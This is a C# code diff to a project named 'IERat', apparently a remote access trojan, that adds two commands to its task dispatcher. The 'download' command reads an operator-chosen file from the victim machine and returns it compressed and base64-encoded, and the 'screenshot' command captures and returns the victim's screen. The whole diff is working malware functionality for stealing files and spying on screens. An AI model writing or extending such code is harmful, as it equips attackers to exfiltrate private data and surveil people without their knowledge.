@@ -2,10 +2,13 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Text;
 using System.Threading.Tasks;
 using System.Web.Script.Serialization;
+using System.Windows.Forms;
 
 namespace IERat
 {
@@ -74,6 +77,17 @@ namespace IERat
                                 {
                                     string pwd = Directory.GetCurrentDirectory();
                                     NewAgentTask.Result = pwd;
+                                }
+                                else if (CmdType == "download")
+                                {
+                                    var File2Send = NewAgentTask.args;
+                                    var FileBytes = File.ReadAllBytes(File2Send);
+                                    NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(FileBytes));
+                                }
+                                else if (CmdType == "screenshot")
+                                {
+                                    var FileBytes = Utils.CollectScreenshot();
+                                    NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(FileBytes));
                                 }
                                 else if (CmdType == "ls")
                                 {
